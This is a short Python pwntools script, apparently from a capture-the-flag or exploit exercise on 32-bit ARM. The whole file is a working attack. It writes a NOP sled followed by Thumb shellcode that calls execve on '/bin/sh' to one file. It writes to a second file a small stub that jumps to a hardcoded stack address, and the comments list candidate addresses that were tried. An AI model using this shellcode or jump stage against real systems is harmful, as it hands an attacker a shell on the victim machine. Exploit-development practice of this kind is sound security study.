#!/usr/bin/env python3
from pwn import *
from pwn import asm, context

context.arch = "arm"
context.bits = 32

# ldr     pc, =#0xfffff446
# addr:
# 65 -> r0
# 0  -> r1
# 0  -> r2
# 11 -> r7
binshcode = asm("mov r8, r8") * 2000
binshcode += asm(
    """
.code 32
add     r2, pc, #1
bx      r2
.code 16
adr     r0, binsh
sub     r1, r1
mov     r2, r1
strb    r2, [r0, #7]
mov     r7, 11
svc     1
binsh:
    .ascii "/bin/shX"
"""
)
binshcode += b"a"
with open("binshcode.bin", "wb") as binsh_file:
    binsh_file.write(binshcode)

# mov    r0, #65
# mov32 r5, #0xfffff428
# 0xfffeef78
# 0xfffef108
# 0xFFFEF5E8
# 0xfffef55c
# 0xfffef428
# 0xfffef028
# 0xfffef560
# 0xfffef55c, 128 * 8 + 1(pre)
# 0xfffef55c, 128 * 8 + 2(pre)
# 0xfffef15c, 128 * 8 + 1(ap)
# 0xfffeeb5c, 128 * 20 + 1(ap)
# 0xfffed4e7
# 0xfffef55c
shellcode = asm(
    """
movw r5, #0xf55c
movt r5, #0xfffe
bx r5
"""
)
print(len(shellcode))
with open("shellcode.bin", "wb") as shellcode_file:
    shellcode_file.write(shellcode)
